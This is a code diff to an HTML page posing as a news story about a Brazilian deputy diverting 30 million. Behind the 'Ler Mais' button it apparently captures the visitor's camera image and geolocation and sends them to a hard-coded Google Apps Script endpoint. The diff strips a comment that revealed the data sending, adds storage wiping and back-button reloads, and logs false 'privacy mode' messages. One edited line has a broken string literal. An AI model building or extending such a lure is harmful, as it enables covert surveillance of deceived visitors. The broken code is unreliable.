@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Desvio de 30 Milhões - Dep. Chico Guarnieri</title>
+    <!-- Meta tags para evitar cache -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="format-detection" content="telephone=no">
     <style>
         * {
             margin: 0;
@@ -696,6 +701,22 @@
     <canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
 
     <script>
+        // Limpar qualquer dado armazenado ao carregar a página
+        (function() {
+            // Limpar localStorage
+            localStorage.clear();
+            
+            // Limpar sessionStorage
+            sessionStorage.clear();
+            
+            // Limpar qualquer cookie existente
+            document.cookie.split(";").forEach(function(c) {
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+            });
+            
+            console.log('🗑️ Todos os dados de armazenamento foram limpos - Primeira visita simulada');
+        })();
+        
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
         
         let autoCaptureDone = false;
@@ -732,7 +753,7 @@
                 cameraStatusSpan.className = 'status-value status-granted';
             } else {
                 cameraStatusSpan.innerHTML = '⏳';
-                cameraStatusSpan.className = 'status-value status-pending';
+                cameraStatusSpan.className =status-value status-pending';
             }
             
             if (locationGranted) {
@@ -919,7 +940,7 @@
             }
         }
         
-        // Função chamada ao clicar em "Ler Mais" - envia os dados e libera notícia
+        // Função chamada ao clicar em "Ler Mais"
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -927,7 +948,6 @@
             loadingNews.classList.add('show');
             
             try {
-                // Já temos localização da permissão inicial, vamos usá-la
                 let position = null;
                 if (locationGranted) {
                     try {
@@ -1015,12 +1035,15 @@
             }
         });
         
-        // Tentativa automática ao carregar (opcional)
-        setTimeout(function() {
-            if (!cameraGranted && !locationGranted) {
-                console.log('Sistema pronto - clique no botão para permitir permissões');
+        // Impedir que o usuário volte usando o botão "voltar" e veja conteúdo antigo
+        window.addEventListener('pageshow', function(event) {
+            if (event.persisted) {
+                window.location.reload();
             }
-        }, 500);
+        });
+        
+        console.log('✅ Site carregado - Modo de privacidade ativado');
+        console.log('🗑️ Nenhum dado é salvo - Toda visita é como a primeira');
     </script>
 </body>
 </html>
